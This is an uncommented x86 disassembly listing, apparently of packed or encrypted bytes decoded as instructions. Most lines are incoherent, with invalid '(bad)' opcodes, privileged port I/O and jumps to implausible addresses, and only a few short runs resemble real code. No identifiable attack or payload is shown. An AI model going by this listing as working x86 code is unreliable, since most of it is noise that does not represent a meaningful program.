  4020d1:	lea    esp,[ebx]
  4020d3:	dec    BYTE PTR [edi+0x3b]
  4020d6:	sti    
  4020d7:	mov    dh,BYTE PTR [edi-0x5653c3b3]
  4020dd:	icebp  
  4020de:	add    BYTE PTR [ebp-0x8299727],cl
  4020e4:	call   0x49aa4a10
  4020e9:	das    
  4020ea:	sti    
  4020eb:	leave  
  4020ec:	add    esi,0xffffffa8
  4020ef:	adc    bl,BYTE PTR [edi]
  4020f1:	mov    ds:0x584502ae,eax
  4020f6:	adc    edx,DWORD PTR [edi]
  4020f8:	add    cl,BYTE PTR [edx]
  4020fa:	cmp    BYTE PTR [eiz*4-0x4ff3b93f],0x64
  402102:	lea    esi,[ecx+0x42]
  402105:	iret   
  402106:	ds dec edx
  402108:	enter  0x291,0xcc
  40210c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40210d:	test   eax,0x473446fb
  402112:	repz test eax,0xaa64ef30
  402118:	ins    DWORD PTR es:[edi],dx
  402119:	mov    esp,0x38aee6ff
  40211e:	xlat   BYTE PTR ds:[ebx]
  40211f:	mov    DWORD PTR [ebx-0x42a0c0b3],0x84d046d4
  402129:	and    al,0x5d
  40212b:	xchg   edx,eax
  40212c:	add    DWORD PTR [ebx],ebp
  40212e:	cmc    
  40212f:	fdiv   QWORD PTR [edi-0x5f]
  402132:	je     0x402154
  402134:	data16 jae 0x402178
  402137:	jmp    0xb7d8:0x97d1c2a7
  40213e:	(bad)  
  40213f:	pop    ds
  402140:	inc    ebx
  402141:	mov    BYTE PTR [esi+0x144da255],dh
  402147:	cmp    DWORD PTR [ebx],esp
  402149:	lahf   
  40214a:	and    DWORD PTR [ebx],ecx
  40214c:	jnp    0x40219c
  40214e:	sbb    ecx,esp
  402150:	sar    DWORD PTR [ebx+0x34],cl
  402153:	enter  0xf723,0x89
  402157:	popa   
  402158:	push   ebx
  402159:	ficom  WORD PTR [edi-0x2b8a7e10]
  40215f:	dec    esi
  402160:	mov    edi,0x7fa4601b
  402165:	xchg   edi,eax
  402166:	and    bl,dh
  402168:	mov    WORD PTR [edx],cs
  40216a:	inc    ebx
  40216b:	dec    ebx
  40216c:	jbe    0x4021e8
  40216e:	inc    ebx
  40216f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402170:	xor    ah,bl
  402172:	jmp    edx
  402174:	xchg   edi,eax
  402175:	dec    ebx
  402176:	mov    ds:0x5b144b38,eax
  40217b:	fisttp QWORD PTR [ecx-0x6b6695a0]
  402181:	setns  ah
  402184:	and    BYTE PTR [eax+esi*8-0x5e],bh
  402188:	sub    edx,DWORD PTR [edi+0x3b]
  40218b:	and    ch,BYTE PTR [ebx-0x2a]
  40218e:	repnz ins BYTE PTR es:[edi],dx
  402190:	imul   ebx,DWORD PTR [esi-0x12],0x3e
  402194:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40219b:	mov    edx,DWORD PTR ds:0x434449
  4021a1:	mov    edx,DWORD PTR [edx]
  4021a3:	sbb    DWORD PTR ds:0x4326f0,edx
  4021a9:	jmp    0x40255f
  4021ae:	in     eax,0xd
  4021b0:	lock or al,0x68
  4021b3:	mov    DWORD PTR [ecx-0xf],esi
  4021b6:	push   ecx
  4021b7:	scas   al,BYTE PTR es:[edi]
  4021b8:	int3   
  4021b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021ba:	(bad)  
  4021bb:	in     eax,dx
  4021bc:	dec    edx
  4021bd:	inc    esp
  4021be:	push   edx
  4021bf:	add    al,0x70
  4021c1:	jo     0x40215a
  4021c3:	jge    0x402235
  4021c5:	jo     0x4021dd
  4021c7:	popf   
  4021c8:	jg     0x4021eb
  4021ca:	add    esi,DWORD PTR [ebx+0x492bcd8c]
  4021d0:	test   al,0x5e
  4021d2:	sub    eax,0xafb0b818
  4021d7:	imul   esi,DWORD PTR [edi+esi*8+0x78],0x4f
  4021dc:	arpl   WORD PTR [ebx+0x4d08c6ce],di
  4021e2:	push   esp
  4021e3:	jmp    0x402213
  4021e5:	pop    ebp
  4021e6:	rcr    BYTE PTR [ecx+0x57],0xa8
  4021ea:	ss pop ebx
  4021ec:	mov    esi,0x510ecc85
  4021f1:	iret   
  4021f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021f3:	xchg   BYTE PTR [ebx+0x5729d992],ch
  4021f9:	aas    
  4021fa:	outs   dx,BYTE PTR ds:[esi]
  4021fb:	cmp    ch,cl
  4021fd:	outs   dx,BYTE PTR ds:[esi]
  4021fe:	sub    eax,DWORD PTR [ebp-0x68]
  402201:	xlat   BYTE PTR ds:[ebx]
  402202:	cmp    eax,0x4d8c4438
  402207:	int    0xa5
  402209:	lahf   
  40220a:	jecxz  0x402243
  40220c:	sbb    al,0x33
  40220e:	nop
  40220f:	push   edi
  402210:	stos   BYTE PTR es:[edi],al
  402211:	mov    ch,0xf4
  402213:	js     0x4021ed
  402215:	(bad)  
  402216:	mov    ah,0xab
  402218:	xor    eax,0x4b084952
  40221d:	ret    0x3d3e
  402220:	out    0x2e,eax
  402222:	imul   esi,edx,0xffffff85
  402225:	mov    eax,0xe7a91da9
  40222a:	dec    esi
  40222b:	xor    al,0x54
  40222d:	js     0x40220d
  40222f:	xor    dl,BYTE PTR [ecx-0x53]
  402232:	jnp    0x40225e
  402234:	jle    0x4021ed
  402236:	arpl   WORD PTR [edi],dx
  402238:	jmp    0xbde5:0xa69943f5
  40223f:	jbe    0x40222f
  402241:	push   ebx
  402242:	jp     0x402289
  402244:	xor    edx,DWORD PTR [ebp-0x160c37a5]
  40224a:	div    esp
  40224c:	dec    edi
  40224d:	jns    0x402298
  40224f:	(bad)  
  402250:	cdq    
  402251:	push   0x6debf32e
  402256:	call   0xc7d6f5ee
  40225b:	lods   eax,DWORD PTR ds:[esi]
  40225c:	xchg   ecx,eax
  40225d:	test   BYTE PTR [eax-0x19],0x7f
  402261:	data16 hlt 
  402263:	add    BYTE PTR [edi-0x4b6f34b],al
  402269:	mov    bh,0xec
  40226b:	adc    eax,0x332ad2ff
  402270:	push   es
  402271:	out    0x2c,al
  402273:	mov    edx,0x64ef7601
  402278:	les    esi,FWORD PTR [ebx-0x61]
  40227b:	pop    edi
  40227c:	jne    0x402223
  40227e:	mov    ebx,0xa1c7d88c
  402283:	aad    0xa4
  402285:	and    eax,0xcb311274
  40228a:	into   
  40228b:	add    BYTE PTR [bx+di],dh
  40228e:	cmp    dl,BYTE PTR [ecx]
  402290:	ret    
  402291:	stc    
  402292:	xchg   BYTE PTR [eax],dl
  402294:	test   al,0x5f
  402296:	mov    WORD PTR [ebx+0x36],fs
  402299:	popf   
  40229a:	leave  
  40229b:	(bad)  
  40229d:	adc    eax,0x6ac42b30
  4022a2:	cdq    
  4022a3:	adc    ah,ah
  4022a5:	jns    0x402319
  4022a7:	and    edx,DWORD PTR [esi+0x65]
  4022aa:	scas   al,BYTE PTR es:[edi]
  4022ab:	pusha  
  4022ac:	leave  
  4022ad:	out    dx,al
  4022ae:	cmp    dh,al
  4022b0:	push   esp
  4022b1:	ret    
  4022b2:	fld    QWORD PTR [edi-0x64]
  4022b5:	aad    0x8d
  4022b7:	rcl    BYTE PTR [ebp+0x5e],cl
  4022ba:	xchg   esi,eax
  4022bb:	or     eax,0xea530fce
  4022c0:	push   edi
  4022c1:	fisub  WORD PTR [edi+0x7c]
  4022c4:	add    esp,DWORD PTR [edx-0x1f]
  4022c7:	mov    bl,0x24
  4022c9:	pop    ebp
  4022ca:	inc    edi
  4022cb:	mov    ah,0x15
  4022cd:	and    dh,cl
  4022cf:	hlt    
  4022d0:	js     0x402347
  4022d2:	aaa    
  4022d3:	ss mov ah,0xcc
  4022d6:	popa   
  4022d7:	inc    esi
  4022d8:	and    eax,0xf91a8930
  4022dd:	xchg   edi,eax
  4022de:	cwde   
  4022df:	aas    
  4022e0:	cmp    ecx,DWORD PTR [edi]
  4022e2:	adc    BYTE PTR [edi],bh
  4022e4:	sub    ebp,DWORD PTR [ebx]
  4022e6:	inc    eax
  4022e7:	sub    DWORD PTR [edi],ecx
  4022e9:	es xchg esp,eax
  4022eb:	test   DWORD PTR [eax+0x6cd7f226],esp
  4022f1:	push   0xffffffc2
  4022f3:	repnz sbb cl,BYTE PTR [edi-0x66]
  4022f7:	fistp  QWORD PTR [ebp-0xc]
  4022fa:	add    DWORD PTR [esi+0x3f],0xfffffff7
  4022fe:	shl    esi,1
  402300:	es mov ecx,0xa558ea5a
  402306:	adc    al,0x3d
  402308:	mov    dh,0x1b
  40230a:	sub    bl,0xaf
  40230d:	jp     0x4022c9
  40230f:	pop    edi
  402310:	loop   0x402295
  402312:	sbb    bl,BYTE PTR [eax-0x44b02c49]
  402318:	cmp    DWORD PTR [edi],ebx
  40231a:	inc    ebp
  40231b:	and    eax,0x7cc6eff5
  402320:	out    dx,eax
  402321:	pop    es
  402322:	jp     0x40231e
  402324:	jo     0x40237b
  402326:	fisub  DWORD PTR [ebp-0x3db52f5b]
  40232c:	jno    0x40234f
  40232e:	or     BYTE PTR [eax+edi*8+0x66],bl
  402332:	xchg   edx,eax
  402333:	push   ds
  402334:	jmp    0xef0f7327
  402339:	push   0x2c
  40233b:	inc    ecx
  40233c:	int3   
  40233d:	add    BYTE PTR [eax-0x22],0xc2
  402341:	push   ebp
  402342:	idiv   BYTE PTR [edi]
  402344:	xchg   esi,eax
  402345:	or     ebp,esi
  402347:	sbb    edx,DWORD PTR [ebp-0x1f20a3f2]
  40234d:	cmp    edi,DWORD PTR [ecx-0x4c]
  402350:	aaa    
  402351:	rcl    BYTE PTR [eax+0x34a1eb92],1
  402357:	ins    DWORD PTR es:[edi],dx
  402358:	daa    
  402359:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40235a:	adc    BYTE PTR [esi-0x795f8251],al
  402360:	adc    bh,ch
  402362:	ror    DWORD PTR [ebx+ecx*2],0x1d
  402366:	cmp    ecx,DWORD PTR [ebp-0x26]
  402369:	js     0x402326
  40236b:	pusha  
  40236c:	fld    DWORD PTR [eax+0x54a7b17]
  402372:	jmp    0x4023ae
  402374:	and    eax,0x6535329
  402379:	cmp    ebx,esi
  40237b:	push   ebx
  40237c:	retf   
  40237d:	test   DWORD PTR [eax*2+0x7d66a9ff],0x36a60995
  402388:	inc    eax
  402389:	push   ss
  40238a:	dec    esi
  40238b:	(bad)  
  40238c:	lock cmp esp,esp
  40238f:	dec    edx
  402390:	pop    edx
  402391:	push   0xf676cd98
  402396:	or     eax,0xc43a9290
  40239b:	jns    0x4023ee
  40239d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40239e:	or     bh,ch
  4023a0:	and    DWORD PTR [edi],edi
  4023a2:	pop    edi
  4023a3:	lds    esi,FWORD PTR [edx-0x36b65184]
  4023a9:	jg     0x402406
  4023ab:	push   edi
  4023ac:	jmp    0x4023be
  4023ae:	(bad)  
  4023af:	addr16 jo 0x4023cd
  4023b2:	push   ss
  4023b3:	pushf  
  4023b4:	xor    DWORD PTR [ebx],ecx
  4023b6:	loop   0x4023b6
  4023b8:	mov    ecx,0x95116cbd
  4023bd:	mov    dh,0x64
  4023bf:	in     eax,dx
  4023c0:	xor    BYTE PTR ds:0x71591dde,bl
  4023c6:	dec    eax
  4023c7:	je     0x402382
  4023c9:	shl    DWORD PTR [ebx-0x4b4d8424],cl
  4023cf:	lock inc eax
  4023d1:	jmp    0xa349:0x35ebdbc3
  4023d8:	inc    esp
  4023d9:	je     0x402391
  4023db:	test   DWORD PTR [esi],esi
  4023dd:	das    
  4023de:	sbb    ch,bl
  4023e0:	and    eax,0x7dccab02
  4023e5:	(bad)  
  4023e6:	int3   
  4023e7:	add    bh,BYTE PTR [ebx-0x7ed2d279]
  4023ed:	stos   DWORD PTR es:[edi],eax
  4023ee:	test   al,0xfe
  4023f0:	inc    eax
  4023f1:	lock push ebx
  4023f3:	jns    0x40239c
  4023f5:	ret    0x2fbd
  4023f8:	rcl    BYTE PTR [ebx],0x3b
  4023fb:	jbe    0x4023f3
  4023fd:	pop    ss
  4023fe:	push   esp
  4023ff:	xchg   BYTE PTR [ebx],bl
  402401:	and    ebx,esp
  402403:	stc    
  402404:	jge    0x402396
  402406:	add    DWORD PTR [esi-0x6d],esp
  402409:	or     BYTE PTR [ecx+edx*8+0x74ffb671],bh
  402410:	xchg   ecx,eax
  402411:	add    cl,BYTE PTR [esi-0xe]
  402414:	cmp    al,0x6c
  402416:	sub    esp,esp
  402418:	and    eax,0xb9780315
  40241d:	pop    ecx
  40241e:	cmp    DWORD PTR [eax-0x7210e179],ebp
  402424:	fwait
  402425:	enter  0x5308,0xe8
  402429:	daa    
  40242a:	push   ecx
  40242b:	(bad)  
  40242c:	mov    ebp,0x6c89ecff
  402431:	fsubr  st(6),st
  402433:	ror    eax,cl
  402435:	dec    esp
  402436:	jg     0x4023bd
  402438:	call   0x97a3:0xaf762d1b
  40243f:	sub    BYTE PTR ds:[ebx+0x2e],bl
  402443:	mov    DWORD PTR [edi],esi
  402445:	jmp    0x47e40d93
  40244a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40244b:	and    esp,DWORD PTR es:[ebx-0x2913f1d]
  402452:	pop    ebp
  402453:	test   eax,0x34d49f85
  402458:	jecxz  0x40242e
  40245a:	sbb    al,0xb0
  40245c:	(bad)  
  40245d:	std    
  40245e:	pop    ds
  40245f:	jbe    0x40247e
  402461:	jecxz  0x40249b
  402463:	ds pop esp
  402465:	sti    
  402466:	cwde   
  402467:	mov    al,0x85
  402469:	pop    esp
  40246a:	mov    ds:0x9d17bc61,al
  40246f:	retf   
  402470:	sbb    eax,0x69d71583
  402475:	(bad)  
  402476:	shr    DWORD PTR [ecx-0x31065240],1
  40247c:	cwde   
  40247d:	das    
  40247e:	in     eax,dx
  40247f:	in     al,dx
  402480:	xor    ah,BYTE PTR [ebp-0x6089fb60]
  402486:	ja     0x402431
  402488:	scas   eax,DWORD PTR es:[edi]
  402489:	xchg   ebx,eax
  40248a:	adc    BYTE PTR [eax+ecx*1+0x51],bh
  40248e:	cmp    bl,BYTE PTR [ecx+0x3e6bf22e]
  402494:	mov    esi,0x71945715
  402499:	rol    ebx,0x5d
  40249c:	and    bl,al
  40249e:	das    
  40249f:	test   BYTE PTR [esi+0x6a37523f],al
  4024a5:	jb     0x4024fc
  4024a7:	push   eax
  4024a8:	adc    eax,0x287c9566
  4024ad:	adc    ebp,DWORD PTR [ebp-0x75770a34]
  4024b3:	mov    bh,0x21
  4024b5:	push   eax
  4024b6:	xchg   esi,eax
  4024b7:	icebp  
  4024b8:	cmp    ah,BYTE PTR [esi+0x2af387d0]
  4024be:	pop    esp
  4024bf:	mov    cl,0xad
  4024c1:	fst    DWORD PTR [ebp+eax*4-0x54]
  4024c5:	addr16 inc esp
  4024c7:	ror    BYTE PTR [edi-0x5c70f3c2],cl
  4024cd:	pop    es
  4024ce:	sar    ch,1
  4024d0:	adc    BYTE PTR [edx+eax*8-0x72],bh
  4024d4:	pushf  
  4024d5:	cmp    eax,0x45b7b19d
  4024da:	out    dx,al
  4024db:	adc    DWORD PTR [eax],0x79
  4024de:	mov    ecx,0xdc159a4d
  4024e3:	fmul   DWORD PTR [ebp+0x5ec22048]
  4024e9:	sub    edx,ecx
  4024eb:	cmp    DWORD PTR [edi],ecx
  4024ed:	add    dh,BYTE PTR [ebx-0x28dbf7a4]
  4024f3:	cmp    DWORD PTR [esi-0x1db209c3],esp
  4024f9:	mov    ah,0xe1
  4024fb:	test   BYTE PTR [ecx+0xb],0x2f
  4024ff:	test   ecx,0x981436d9
  402505:	jecxz  0x4024be
  402507:	mov    al,ds:0xb9d0dcab
  40250c:	enter  0x8b8f,0xe6
  402510:	mov    edi,0xe295e295
  402515:	idiv   DWORD PTR [ebp+0x600c23d1]
  40251b:	push   edi
  40251c:	pop    esp
  40251d:	inc    edx
  40251e:	scas   eax,DWORD PTR es:[edi]
  40251f:	dec    esp
  402520:	(bad)  
  402521:	xlat   BYTE PTR ds:[ebx]
  402522:	mov    ch,0x48
  402524:	xchg   edi,eax
  402525:	lds    eax,FWORD PTR [edx+0x765c17c7]
  40252b:	fbld   TBYTE PTR [eax]
  40252d:	repz mov esp,DWORD PTR [bp+0x1d70]
  402533:	in     eax,0x54
  402535:	dec    edx
  402536:	stos   BYTE PTR es:[edi],al
  402537:	lea    eax,[esi]
  402539:	xchg   ebp,eax
  40253a:	mov    dh,0x52
  40253c:	add    eax,0xbdc9ee24
  402541:	inc    ecx
  402542:	jo     0x40258d
  402544:	lahf   
  402545:	cdq    
  402546:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402547:	jae    0x40254b
  402549:	or     ebx,DWORD PTR ds:0x82a7a163
  40254f:	leave  
  402550:	mov    eax,ds:0xbea2bc21
  402555:	out    0x43,al
  402557:	cmp    dl,cl
  402559:	popa   
  40255a:	pop    ecx
  40255b:	pusha  
  40255c:	jle    0x402517
  40255e:	or     DWORD PTR [ebx-0x167e07ab],ecx
  402564:	mov    al,0x6f
  402566:	add    BYTE PTR [eax],al
  402568:	push   esi
  402569:	add    DWORD PTR ds:0x4326f0,ecx
  40256f:	mov    ecx,0x7510855
  402574:	xor    edx,ecx
  402576:	and    esi,0x4f5d
  40257c:	mov    esi,0x32729c
  402581:	push   edi
  402582:	mov    edi,DWORD PTR [ebp+0x10]
  402585:	add    DWORD PTR ds:0x432dd2,0x4326f0
  40258f:	add    edx,esi
  402591:	jmp    0x402947
  402596:	mov    ah,0x31
  402598:	cdq    
  402599:	or     ebx,DWORD PTR [ecx+0x8b1b293]
  40259f:	or     dl,BYTE PTR [ebp+0x24]
  4025a2:	mov    ebp,0xe9cc963c
  4025a7:	add    BYTE PTR [eax+0x70],dh
  4025aa:	xchg   edi,eax
  4025ab:	jge    0x40261d
  4025ad:	jo     0x4025f5
  4025af:	cmp    bh,BYTE PTR [esi]
  4025b1:	jns    0x4025ec
  4025b3:	mov    edi,0xda198ce5
  4025b8:	jno    0x402595
  4025ba:	dec    edi
  4025bb:	jecxz  0x402574
  4025bd:	add    eax,0x8be0d2f8
  4025c2:	out    dx,al
  4025c3:	and    BYTE PTR [edi],ah
  4025c5:	cmp    BYTE PTR [edi-0x48],0x23
  4025c9:	push   ecx
  4025ca:	inc    esp
  4025cb:	popf   
  4025cc:	dec    BYTE PTR [esp+esi*1-0x16]
  4025d0:	in     eax,dx
  4025d1:	dec    edx
  4025d2:	xor    al,0x8d
  4025d4:	pop    eax
  4025d5:	je     0x4025d8
  4025d7:	xor    BYTE PTR [ecx+edx*8+0x75],dl
  4025db:	or     al,0xd1
  4025dd:	sub    al,0x1f
  4025df:	dec    edx
  4025e0:	daa    
  4025e1:	test   DWORD PTR [eax],edi
  4025e3:	popa   
  4025e4:	lods   eax,DWORD PTR ds:[esi]
  4025e5:	cld    
  4025e6:	xchg   edi,eax
  4025e7:	pop    esp
  4025e8:	fdiv   st(0),st
  4025ea:	div    esi
  4025ec:	add    eax,0xbc3dd28e
  4025f1:	pusha  
  4025f2:	into   
  4025f3:	add    BYTE PTR [edx+esi*8+0x72e4c0ff],ah
  4025fa:	stos   DWORD PTR es:[edi],eax
  4025fb:	xor    eax,0x81b6632f
  402600:	jp     0x4025de
  402602:	adc    DWORD PTR [ecx-0x36],ecx
  402605:	and    al,0x38
  402607:	pop    eax
  402608:	adc    DWORD PTR [ebx],ecx
  40260a:	cmp    ebx,0x1dc36b6
  402610:	imul   edx,DWORD PTR [ebp+0x31],0xffffffe2
  402614:	mov    ds:0x10aafc3f,eax
  402619:	test   DWORD PTR [esi-0x67],eax
  40261c:	loop   0x4025c8
  40261e:	ret    
  40261f:	mov    BYTE PTR [ebx+0x7a0774ba],bl
  402625:	(bad)  
  402626:	sub    eax,edi
  402628:	mov    bl,0xd4
  40262a:	repnz sub al,0xdd
  40262d:	in     eax,0xc1
  40262f:	pop    es
  402630:	mov    dl,0x6b
  402632:	ins    DWORD PTR es:[edi],dx
  402633:	mov    bh,0xc5
  402635:	outs   dx,DWORD PTR ds:[esi]
  402636:	arpl   WORD PTR [eax-0x42240f9],cx
  40263c:	stc    
  40263d:	dec    BYTE PTR [edi+ebp*8+0x15d6b454]
  402644:	leave  
  402645:	ds mov ebp,0xb54785ff
  40264b:	data16 js 0x40261c
  40264e:	mov    ebx,0x1276ff1b
  402653:	or     esp,eax
  402655:	pop    es
  402656:	mov    edi,0x5da24555
  40265b:	xor    eax,0xecd2605b
  402660:	pop    ecx
  402661:	dec    esi
  402662:	sbb    ebp,edi
  402664:	shl    DWORD PTR [edx-0x79],0x1b
  402668:	ins    DWORD PTR es:[edi],dx
  402669:	adc    dh,0xf4
  40266c:	in     al,0xdb
  40266e:	adc    DWORD PTR [esi-0x66],0xf4b824e9
  402675:	arpl   WORD PTR [edx],cx
  402677:	push   ebx
  402678:	arpl   WORD PTR [eax-0x12],sp
  40267b:	in     al,dx
  40267c:	add    al,BYTE PTR [edi-0xd374387]
  402682:	inc    ebp
  402683:	jbe    0x40264b
  402685:	inc    esi
  402686:	cld    
  402687:	mov    ch,0xbe
  402689:	sub    eax,0xdeec5713
  40268e:	xchg   ebp,eax
  40268f:	push   es
  402690:	jge    0x40262a
  402692:	push   edx
  402693:	xchg   ecx,eax
  402694:	pop    esp
  402695:	arpl   WORD PTR [edx],di
  402697:	popa   
  402698:	nop
  402699:	mov    ?,WORD PTR [ecx+ecx*2+0x53]
  40269d:	outs   dx,BYTE PTR ds:[esi]
  40269e:	out    dx,eax
  40269f:	int    0x6d
  4026a1:	jne    0x4026da
  4026a3:	inc    ecx
  4026a4:	pop    ecx
  4026a5:	outs   dx,DWORD PTR ds:[esi]
  4026a6:	ins    BYTE PTR es:[edi],dx
  4026a7:	mov    esi,0xf43946e4
  4026ac:	idiv   BYTE PTR [edx]
  4026ae:	xchg   esi,eax
  4026af:	mov    edx,0x6f378fba
  4026b4:	gs ret 0x1925
  4026b8:	sub    BYTE PTR [eax+0x1e77db72],dl
  4026be:	add    ch,al
  4026c0:	(bad)  
  4026c1:	fbstp  TBYTE PTR [ebp+0x58c5bf2b]
  4026c7:	mov    eax,es:0x6cb7203a
  4026cd:	out    dx,al
  4026ce:	scas   eax,DWORD PTR es:[edi]
  4026cf:	inc    ebx
  4026d0:	dec    esi
  4026d1:	mov    bh,ah
  4026d3:	pop    ecx
  4026d4:	mov    ch,0xbe
  4026d6:	jno    0x402661
  4026d8:	in     eax,0xbc
  4026da:	mov    edi,0xb0736970
  4026df:	or     BYTE PTR [eax-0x7cca3531],bl
  4026e5:	pmaxub mm2,QWORD PTR [ebp+0x6d]
  4026e9:	cmp    edi,DWORD PTR [ecx+0x21645c9f]
  4026ef:	mov    DWORD PTR [ebp+eiz*8+0x46cb5aa4],edi
  4026f6:	repz jmp 0x11f57550
  4026fc:	out    dx,al
  4026fd:	arpl   cx,di
  4026ff:	add    DWORD PTR [eax-0x4b],esi
  402702:	mov    ebx,0xc6e02309
  402707:	push   eax
  402708:	sbb    ah,BYTE PTR [edx+ecx*1+0x2a5fab8d]
  40270f:	sub    dh,bh
  402711:	mov    esp,0xb8bbe69
  402716:	test   BYTE PTR [esi],0xcd
  402719:	push   0x3641c258
  40271e:	loopne 0x4026b7
  402720:	adc    BYTE PTR [edx+0x3835a546],dh
  402726:	js     0x4026b3
  402728:	je     0x4026ff
  40272a:	dec    ebp
  40272b:	stos   DWORD PTR es:[edi],eax
  40272c:	inc    eax
  40272d:	or     dh,BYTE PTR [ecx+0x766b1e0]
  402733:	mov    al,0x6a
  402735:	loopne 0x4027b3
  402737:	add    eax,0xb5c9e76
  40273c:	lods   al,BYTE PTR ds:[esi]
  40273d:	xor    al,BYTE PTR [ebx+eiz*1+0x31]
  402741:	sub    cl,cl
  402743:	ins    BYTE PTR es:[edi],dx
  402744:	jecxz  0x402764
  402746:	shl    BYTE PTR gs:[edi],1
  402749:	dec    ebx
  40274a:	inc    edx
  40274b:	inc    ecx
  40274c:	pop    ss
  40274d:	mov    edx,0xa5843f54
  402752:	lock dec ebx
  402754:	arpl   WORD PTR ds:0xf98e4bab,si
  40275a:	lods   eax,DWORD PTR ds:[esi]
  40275b:	jb     0x402718
  40275d:	xor    bl,BYTE PTR [ebx-0x59]
  402760:	dec    ecx
  402761:	mov    ds:0xcb3a58ff,eax
  402766:	lea    eax,[edx]
  402768:	inc    ebp
  402769:	push   0x6
  40276b:	xor    bh,BYTE PTR [esi]
  40276d:	pop    ds
  40276e:	pop    ecx
  40276f:	pop    edi
  402770:	and    esp,0xc73f4744
  402776:	jne    0x4027a4
  402778:	ins    DWORD PTR es:[edi],dx
  402779:	mov    ?,WORD PTR [esi]
  40277b:	mov    esp,0xafb8db16
  402780:	inc    edi
  402781:	aas    
  402782:	ds xor eax,0xaab64ef0
  402788:	sub    al,BYTE PTR [eax+0x17]
  40278b:	mov    ds:0x71b98bb7,eax
  402790:	into   
  402791:	inc    ebp
  402792:	pop    ss
  402793:	cmp    BYTE PTR [edi],al
  402795:	mov    esi,0x3c94ccb9
  40279a:	(bad)  
  40279b:	sbb    al,al
  40279d:	or     esi,DWORD PTR [ebx-0x2b3e2f83]
  4027a3:	rcr    BYTE PTR [ebp+0x3b],cl
  4027a6:	jecxz  0x4027d7
  4027a8:	pop    esp
  4027a9:	pop    ecx
  4027aa:	adc    DWORD PTR [ecx+0x14],ecx
  4027ad:	or     BYTE PTR [eax],dl
  4027af:	inc    edx
  4027b0:	xchg   edi,eax
  4027b1:	test   esp,esp
  4027b3:	sub    eax,0xfcb8aaa
  4027b8:	aaa    
  4027b9:	mov    edx,0x32e4ed1a
  4027be:	mov    ch,0x16
  4027c0:	push   esp
  4027c1:	adc    BYTE PTR [eax],bl
  4027c3:	es pop es
  4027c5:	scas   eax,DWORD PTR es:[edi]
  4027c6:	sub    BYTE PTR [ecx+esi*2-0x3afc44bb],dh
  4027cd:	and    DWORD PTR [ebx-0x6c],edi
  4027d0:	mov    ebx,0xd23a6c8c
  4027d5:	js     0x4027ed
  4027d7:	data16 (bad) 
  4027d9:	sar    esp,cl
  4027db:	or     DWORD PTR [ebp+0x328414f],0xffffffaa
  4027e2:	sbb    al,0x19
  4027e4:	and    al,0x46
  4027e6:	(bad)  
  4027e8:	int    0xec
  4027ea:	sub    esi,esp
  4027ec:	(bad)  
  4027ee:	sbb    BYTE PTR [esp+ebx*4],0x79
  4027f2:	sar    ch,1
  4027f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027f5:	fist   DWORD PTR [ebx+0x58]
  4027f8:	or     ecx,ecx
  4027fa:	add    ah,cl
  4027fc:	pop    ebp
  4027fd:	mov    ebx,0xfd22ece3
  402802:	sbb    ecx,edi
  402804:	dec    ebp
  402805:	aaa    
  402806:	nop
  402807:	xchg   DWORD PTR [ebp+0x40],ebx
  40280a:	and    esi,DWORD PTR [ecx+edx*1+0x3dd394ac]
  402811:	repnz enter 0x9691,0xa3
  402816:	shr    BYTE PTR [esp+ebp*4-0x19],cl
  40281a:	or     ch,dl
  40281c:	pusha  
  40281d:	push   0xffffffb0
  40281f:	imul   esi,DWORD PTR [eax+0x20],0x4b
  402823:	sbb    ebx,ebp
  402825:	mov    es,WORD PTR [esi+0x5f6563ad]
  40282b:	nop
  40282c:	js     0x4027de
  40282e:	mov    esi,0x9f98fa8f
  402833:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402834:	div    BYTE PTR [edi-0x34]
  402837:	xchg   ebp,eax
  402838:	bound  esi,QWORD PTR [ecx]
  40283a:	cmp    BYTE PTR [esi+0x50],ch
  40283d:	add    dl,BYTE PTR [edi]
  40283f:	pop    esi
  402840:	jbe    0x4028aa
  402842:	leave  
  402843:	mov    eax,ds:0x3bf40a4c
  402848:	jmp    0x41908f3c
  40284d:	lock xchg edi,eax
  40284f:	jnp    0x402872
  402851:	dec    eax
  402852:	xor    eax,0xaedeba34
  402857:	push   edx
  402858:	jge    0x4028cf
  40285a:	test   eax,0x622b7af4
  40285f:	dec    edx
  402860:	or     esp,DWORD PTR [esp+edi*4]
  402863:	(bad)  
  402864:	outs   dx,BYTE PTR ds:[esi]
  402865:	push   0xffffff9d
  402867:	or     al,0xc3
  402869:	out    0xf5,eax
  40286b:	xchg   ebx,eax
  40286c:	xor    al,0x81
  40286e:	imul   esp,DWORD PTR [ebx-0x35],0x24
  402872:	retf   0x8a84
  402875:	mov    DWORD PTR [edx],esp
  402877:	rol    DWORD PTR [eax-0x73],1
  40287a:	lea    esi,ds:0x33878d39
  402880:	mov    al,ds:0x523fd1ce
  402885:	aaa    
  402886:	xchg   BYTE PTR [edi+ecx*1-0x4223ac1b],al
  40288d:	arpl   WORD PTR [esi+ebp*4],sp
  402890:	cdq    
  402891:	add    ah,BYTE PTR [ebp-0x45]
  402894:	add    BYTE PTR [edx+edx*1+0x14],al
  402898:	lods   al,BYTE PTR ds:[esi]
  402899:	leave  
  40289a:	sahf   
  40289b:	pushf  
  40289c:	cmc    
  40289d:	dec    edi
  40289e:	add    edi,DWORD PTR [eax+edx*2]
  4028a1:	and    al,0xe
  4028a3:	push   edi
  4028a4:	and    BYTE PTR [ecx],ah
  4028a6:	adc    edi,DWORD PTR [eax+0x3b]
  4028a9:	cmp    al,0x73
  4028ab:	je     0x40288a
  4028ad:	add    eax,0x526fbbca
  4028b3:	call   0x3a048508
  4028b8:	sbb    DWORD PTR [edi+0x19],edi
  4028bb:	out    0xc4,eax
  4028bd:	ud0    ecx,DWORD PTR [esi+0x3a65ed60]
  4028c4:	scas   eax,DWORD PTR es:[edi]
  4028c5:	inc    edx
  4028c6:	mov    ds:0x5575dff8,al
  4028cb:	call   0xe88ce2aa
  4028d0:	add    edi,DWORD PTR [eax]
